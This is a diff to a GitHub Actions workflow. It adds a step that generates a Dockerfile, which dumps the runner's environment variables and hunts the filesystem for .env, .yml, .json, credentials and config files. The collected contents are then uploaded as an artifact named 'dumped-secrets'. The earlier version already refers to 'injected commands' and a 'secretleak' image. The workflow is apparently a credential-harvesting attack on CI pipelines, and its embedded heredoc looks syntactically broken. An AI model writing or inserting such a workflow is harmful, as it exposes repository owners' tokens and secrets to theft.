@@ -8,19 +8,37 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout repository
+      - name: Checkout repo
         uses: actions/checkout@v4
 
-      - name: Build Docker image with injected commands
-        run: |
-          docker build --no-cache -t secretleak ./taskcluster/docker/python
+      - name: Create Dockerfile
+        run: cat <<EOF > Dockerfile
+FROM python:3.11-alpine
 
-      - name: Run container and dump leak
-        run: |
-          docker run --rm secretleak > full_leak.txt
+RUN apk add --no-cache grep findutils
 
-      - name: Upload leaked secrets as artifact
+RUN echo "[ENVIRONMENT VARIABLES]" > /secrets.txt && \
+    (printenv | grep -v 'GITHUB_TOKEN' || true) >> /secrets.txt && \
+    echo "\n\n[FILESYSTEM SECRETS (.env, .yml, credentials, etc)]" >> /secrets.txt && \
+    find / -type f \\
+      -iname "*.env" -o \
+      -iname "*.yml" -o \
+      -iname "*.json" -o \
+      -iname "credentials" -o \
+      -iname "config" \
+    \ -exec sh -c 'echo "\\n--- {} ---" && cat "{}"' \\; >> /secrets.txt 2>/dev/null || true
+
+CMD ["cat", "/secrets.txt"]
+EOF
+
+      - name: Build image
+        run: docker build -t leakscan .
+
+      - name: Run container and dump secrets
+        run: docker run --rm leakscan > all_secrets.txt
+
+      - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: full-secrets
-          path: full_leak.txt
+          name: dumped-secrets
+          path: all_secrets.txt
